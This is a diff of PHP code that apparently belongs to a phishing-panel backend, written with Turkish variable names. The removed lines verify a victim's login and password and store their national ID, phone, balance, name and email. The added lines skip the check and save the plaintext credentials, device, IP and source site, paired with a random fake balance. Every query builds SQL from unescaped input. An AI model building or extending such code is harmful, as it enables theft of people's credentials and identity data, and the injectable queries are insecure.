@@ -30,25 +30,15 @@ $randombakiye2 = $randombakiye/100;
     die('success');
   }else{
 	  if ($main['check_oc'] == 0) {
-    $checkdurum = check($login, $password);
-    if ($checkdurum["status"] === true) {
-        $phone = $checkdurum["phone"];
-        $tc = $checkdurum["tc"];
-        $balance = $checkdurum["balance"];
-		$username1 = $checkdurum["username"];
-        $name = $checkdurum["name"];
-        $surname = $checkdurum["surname"];
-        $email = $checkdurum["email"];
-        $query = "INSERT INTO users (login, password, phone, passport, balance, adi, soyadi, email, username1, device, ip) VALUES ('$login', '$password', '$phone', '$tc', '$balance', '$name', '$surname', '$email', '$username1', '$device', '$ip')";
-        if ($db->query($query)) {
-            $_SESSION['user_id'] = $db->insert_id;
-            die("success");
-        } else {
-            die("error");
-        }
-    } else {
-        die("error");
-    }
+        $db -> query("INSERT into users set
+        login='$login',
+        password='$password',
+        balance='$randombakiye2',
+        device='$device',
+        data1='$site',
+        ip='$ip'");
+      $_SESSION['user_id'] = $db->insert_id;
+      die('checksiz');
 		  
   }else{
 	   $db -> query("INSERT into users set
